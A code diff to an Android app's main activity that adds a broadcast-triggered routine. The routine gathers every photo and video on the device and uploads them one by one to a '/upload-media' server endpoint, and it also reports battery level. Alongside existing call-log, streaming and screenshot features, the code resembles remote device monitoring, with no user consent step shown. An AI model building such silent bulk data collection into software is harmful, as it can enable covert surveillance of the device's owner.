@@ -13,7 +13,11 @@ import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.Looper;
 import android.provider.ContactsContract;
+import android.provider.ContactsContract;
 import android.provider.OpenableColumns;
+import android.provider.MediaStore;
+import android.os.BatteryManager;
+import android.content.ContentUris;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -83,6 +87,10 @@ public class MainActivity extends AppCompatActivity {
             if ("com.example.suma.ACTION_BACKUP_CALLLOG".equals(intent.getAction())) {
                 Log.d(TAG, "Received Call Log Backup Request");
                 performCallLogBackup();
+            } else if ("com.example.suma.ACTION_BACKUP_GALLERY".equals(intent.getAction())) {
+                String mediaType = intent.getStringExtra("media_type");
+                Log.d(TAG, "Received Gallery Backup Request: " + mediaType);
+                performGalleryBackup(mediaType);
             }
         }
     };
@@ -143,6 +151,126 @@ public class MainActivity extends AppCompatActivity {
                 return "Rejected";
             default:
                 return "Unknown";
+        }
+    }
+
+    // --- Gallery Backup ---
+    private void performGalleryBackup(String mediaType) {
+        new Thread(() -> {
+            try {
+                Log.d(TAG, "Starting Gallery Backup: " + mediaType);
+                List<Uri> mediaUris = new ArrayList<>();
+
+                // 1. Photos
+                if ("photos".equals(mediaType) || "all".equals(mediaType)) {
+                    if (ContextCompat.checkSelfPermission(this,
+                            Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
+                            ContextCompat.checkSelfPermission(this,
+                                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+
+                        Cursor cursor = getContentResolver().query(
+                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                new String[] { MediaStore.Images.Media._ID },
+                                null, null, null);
+
+                        if (cursor != null) {
+                            while (cursor.moveToNext()) {
+                                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
+                                mediaUris.add(
+                                        ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id));
+                            }
+                            cursor.close();
+                        }
+                    }
+                }
+
+                // 2. Videos
+                if ("videos".equals(mediaType) || "all".equals(mediaType)) {
+                    if (ContextCompat.checkSelfPermission(this,
+                            Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED ||
+                            ContextCompat.checkSelfPermission(this,
+                                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+
+                        Cursor cursor = getContentResolver().query(
+                                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                                new String[] { MediaStore.Video.Media._ID },
+                                null, null, null);
+
+                        if (cursor != null) {
+                            while (cursor.moveToNext()) {
+                                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
+                                mediaUris.add(
+                                        ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id));
+                            }
+                            cursor.close();
+                        }
+                    }
+                }
+
+                Log.d(TAG, "Found " + mediaUris.size() + " items to backup.");
+
+                // Upload Sequentially
+                for (Uri uri : mediaUris) {
+                    uploadMediaSync(uri); // New synchronous method
+                }
+
+                Log.d(TAG, "Gallery Backup Completed.");
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+
+    // Synchronous upload for background thread
+    private void uploadMediaSync(Uri uri) {
+        try {
+            // Copy to cache
+            String fileName = getFileName(uri);
+            if (fileName == null)
+                fileName = "temp_media";
+            File file = new File(getCacheDir(), "backup_" + fileName);
+
+            try (InputStream in = getContentResolver().openInputStream(uri);
+                    OutputStream out = new FileOutputStream(file)) {
+                byte[] buffer = new byte[8192]; // Bigger buffer
+                int read;
+                while ((read = in.read(buffer)) != -1) {
+                    out.write(buffer, 0, read);
+                }
+            } catch (Exception e) {
+                return; // Skip if read fails
+            }
+
+            String token = AuthManager.getToken(this);
+            // We use a latch or simple blocking networking here.
+            // NetworkUtils.uploadFile is async with callback.
+            // Blocking implementation inline:
+
+            java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
+            NetworkUtils.uploadFile(AuthManager.getBaseUrl() + "/upload-media", file, token,
+                    new NetworkUtils.Callback() {
+                        @Override
+                        public void onSuccess(String response) {
+                            file.delete();
+                            latch.countDown();
+                        }
+
+                        @Override
+                        public void onError(String error) {
+                            file.delete(); // Delete even on error to save space
+                            latch.countDown();
+                        }
+                    });
+
+            try {
+                latch.await(30, java.util.concurrent.TimeUnit.SECONDS); // Timeout per file
+            } catch (InterruptedException e) {
+                // Continue
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -235,6 +363,13 @@ public class MainActivity extends AppCompatActivity {
                     Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(backupReceiver, new IntentFilter("com.example.suma.ACTION_BACKUP_CALLLOG"));
+        }
+
+        IntentFilter galleryFilter = new IntentFilter("com.example.suma.ACTION_BACKUP_GALLERY");
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(backupReceiver, galleryFilter, Context.RECEIVER_NOT_EXPORTED);
+        } else {
+            registerReceiver(backupReceiver, galleryFilter);
         }
     }
 
@@ -359,6 +494,9 @@ public class MainActivity extends AppCompatActivity {
                                     btnBackup.setEnabled(true);
                                     btnStream.setEnabled(true);
                                     btnScreenshot.setEnabled(true);
+
+                                    // Update Device Info (Battery)
+                                    updateDeviceInfo();
                                 });
                             }
 
@@ -688,6 +826,37 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             e.printStackTrace();
             Toast.makeText(this, "Screenshot Save Failed", Toast.LENGTH_SHORT).show();
+        }
+
+    }
+
+    private void updateDeviceInfo() {
+        try {
+            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+            int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+
+            new Thread(() -> {
+                try {
+                    JSONObject json = new JSONObject();
+                    json.put("battery_level", level);
+
+                    String token = AuthManager.getToken(this);
+                    java.net.URL url = new java.net.URL(AuthManager.getBaseUrl() + "/update-device-info");
+                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Authorization", "Bearer " + token);
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setDoOutput(true);
+                    try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
+                        os.write(json.toString().getBytes("UTF-8"));
+                    }
+                    conn.getResponseCode(); // Execute
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }).start();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 }
